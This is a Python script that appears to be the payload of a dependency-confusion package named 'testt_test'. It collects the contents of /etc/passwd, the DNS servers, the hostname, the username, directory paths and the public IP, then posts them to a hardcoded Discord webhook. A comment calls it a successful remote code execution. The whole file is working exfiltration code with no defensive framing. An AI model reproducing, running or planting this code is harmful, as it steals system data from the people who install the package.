import os
import socket
import json
import datetime
import platform
import requests
from importlib.metadata import metadata

# Read the /etc/passwd file
try:
    with open("/etc/passwd", "r") as f:
        passwd_data = f.read()
except Exception as e:
    passwd_data = f"Error reading /etc/passwd: {str(e)}"

# Get current time
current_time = datetime.datetime.now().isoformat()

# Get package metadata
package_name = "testt_test"
try:
    package_metadata = metadata(package_name)
    package_version = package_metadata["Version"]
    package_json = {
        "name": package_name,
        "version": package_version,
        "description": package_metadata.get("Description", ""),
        "author": package_metadata.get("Author", ""),
    }
except:
    package_version = "1.0.1"
    package_json = {"name": package_name, "version": package_version}

# Get DNS servers (Linux-specific, may not work on all systems)
try:
    with open("/etc/resolv.conf", "r") as f:
        dns_servers = [line.split()[1] for line in f if line.startswith("nameserver")]
except:
    dns_servers = ["Unknown"]

# Function to get public IP using api.ipify.org
def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org", timeout=5)
        response.raise_for_status()
        return response.text
    except Exception as e:
        return f"Error getting public IP: {str(e)}"

# Collect all tracking data
def collect_data():
    public_ip = get_public_ip()
    try:
        username = os.getlogin()
    except:
        username = "Unknown"
    tracking_data = {
        "package": package_name,
        "current_dir": os.getcwd(),
        "home_dir": os.path.expanduser("~"),
        "hostname": socket.gethostname(),
        "username": username,
        "dns_servers": dns_servers,
        "resolved": None,  # Python doesn't have a direct equivalent to packageJSON.___resolved
        "version": package_version,
        "package_json": package_json,
        "passwd_content": passwd_data,
        "time": current_time,
        "originating_ip": public_ip,
    }
    return tracking_data

# Add custom notes
custom_notes = "Successful R_C_E via dependency confusion."

# Format the message for readability
def format_message(tracking_data):
    return f"""
Endpoint: https://example.com/endpoint

All Information:
- Package: {tracking_data['package']}
- Current Directory: {tracking_data['current_dir']}
- Home Directory: {tracking_data['home_dir']}
- Hostname: {tracking_data['hostname']}
- Username: {tracking_data['username']}
- DNS Servers: {json.dumps(tracking_data['dns_servers'])}
- Resolved: {tracking_data['resolved']}
- Version: {tracking_data['version']}
- Package JSON: {json.dumps(tracking_data['package_json'], indent=2)}
- /etc/passwd Content: {tracking_data['passwd_content']}
- Time: {tracking_data['time']}
- Originating IP: {tracking_data['originating_ip']}

Custom Notes:
{custom_notes}
"""

# Send to Discord Webhook
def send_to_discord(message):
    discord_webhook_url = "https://discord.com/api/webhooks/1410258094511882250/fPTbDPbFfrSaOKDwXDfeqfwlKlhdS5tpev8nD7giRFhAldmRpJaGlI6Y5IWqOpdxYNbx"
    headers = {"Content-Type": "application/json"}
    data = json.dumps({"content": message})
    try:
        response = requests.post(discord_webhook_url, data=data, headers=headers, timeout=5)
        response.raise_for_status()
        print(f"Successfully sent data to Discord webhook: {response.status_code}")
    except Exception as e:
        print(f"Error sending to Discord: {str(e)}")

def run():
    tracking_data = collect_data()
    formatted_message = format_message(tracking_data)
    print(formatted_message)  # Output to console
    send_to_discord(formatted_message)

if __name__ == "__main__":
    run()